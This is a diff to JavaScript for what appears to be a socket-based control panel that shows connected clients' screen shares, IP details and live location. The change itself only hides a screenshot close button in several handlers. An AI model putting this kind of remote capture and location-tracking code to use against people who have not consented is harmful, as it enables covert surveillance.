@@ -48,13 +48,16 @@ const demo = (id) => {
 
         if (ssDiv.children[0]) {
             ssDiv.children[0].remove();
+            closeScreenShot.style.display = 'none';
         }
         if (infoDiv.innerText) {
             infoDiv.style.display = 'none';
+            closeScreenShot.style.display = 'none';
         }
         if (map.innerHTML) {
             clearInterval(intervalLocation);
             map.style.display = 'none';
+            closeScreenShot.style.display = 'none';
         }
     } else {
         dataModel.style.display = dataModel.style.display === 'flex' ? 'none' : 'flex';
@@ -292,6 +295,7 @@ socket.on('connect', async () => {
 
     document.getElementById('screenShare').addEventListener('click', () => {
         infoDiv.style.display = 'none';
+        closeScreenShot.style.display = 'none';
         clearInterval(intervalLocation);
         map.style.display = 'none';
         if (ssDiv.children[0]) {
@@ -317,6 +321,7 @@ socket.on('connect', async () => {
     onSiteNotification.addEventListener('click', () => {
         notificationModel.style.display = 'block';
         notificationModel.style.zIndex = '999';
+        closeScreenShot.style.display = 'none';
     });
 
     document.getElementById('sendNotification').addEventListener('click', (e) => {
@@ -419,6 +424,7 @@ socket.on('connect', async () => {
         const ipAdd = binaryToString(ip);
         infoDiv.style.display = 'block';
         ssDiv.style.display = 'none';
+        closeScreenShot.style.display = 'none';
         map.style.display = 'none';
         clearInterval(intervalLocation);
         infoDiv.innerHTML = `<h3>Ip address :- ${ipAdd}</h3>`;
@@ -439,6 +445,7 @@ socket.on('connect', async () => {
         const ipAdd = JSON.parse(ipJsonString);
         infoDiv.style.display = 'block';
         ssDiv.style.display = 'none';
+        closeScreenShot.style.display = 'none';
         map.style.display = 'none';
         clearInterval(intervalLocation);
         infoDiv.innerHTML = `
@@ -455,6 +462,7 @@ socket.on('connect', async () => {
 
     document.getElementById('location').addEventListener('click', () => {
         infoDiv.style.display = 'none';
+        closeScreenShot.style.display = 'none';
         ssDiv.style.display = 'none';
         function stringToBinary(str) {
             return str.split('').map(char => {
